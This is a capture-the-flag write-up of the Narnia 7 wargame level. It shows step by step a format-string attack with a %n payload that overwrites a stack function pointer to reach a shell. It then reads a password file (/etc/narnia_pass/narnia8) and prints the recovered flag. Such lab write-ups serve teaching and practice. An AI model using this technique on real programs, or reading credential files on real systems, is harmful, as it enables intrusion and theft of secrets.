@@ -1,0 +1,45 @@
+Looking at the source code, we have the goodfunction(), the hackedfunction(), main() and
+vuln().
+Basically main() calls vuln() and majority of stuff happens here.
+Execute the binary with jake as an argument: ./narnia7 jake
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd658)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+
+Okay so we have the memory address of the goodfunction() and the hackedfunction(),
+inside vuln(), address of the goodfunction() is used and returned:
+
+ptrf = goodfunction;
+snprintf(buffer, sizeof buffer, format);
+return ptrf();
+
+With the snprintf() function being used, and having to overwrite data on the stack =>
+another format string attack. :(
+
+Based on the above outout, before : ptrf() = 0x80486ff (0xffffd658), we're gonna have to
+overwrite 0x80486ff (goodfunction) with 0x8048724 (hackedfuction) at the address 0xffffd658
+on the stack frame.
+
+Playing with it for a while, I found out that the payload should look like:
+
+
+the value 0x8048724 of the hackedfunction() is 134514468, -4 = 134514464 since we're gonna overwrite
+the value at the mem address \x58\xd6\xff\xff (4 bytes)
+./narnia7 $(python -c 'print("\x58\xd6\xff\xff" + "%134514464d%1$n")')
+d since we used decimal
+
+actually the new address it gives us is \x48\xd6.. instead of \x58\ like before, not sure
+why.
+
+./narnia7 $(python -c 'print("\x48\xd6\xff\xff" + "%134514464d%1$n")')
+we got a segfault with this.
+
+Tried with ./narnia7 $(python -c 'print("\x58\xd6\xff\xff" + "%134514464d%2$n")') (2nd
+position)
+
+we got a new shell!
+cat /etc/narnia_pass/narnia8
+flag retrieved: mohthuphog
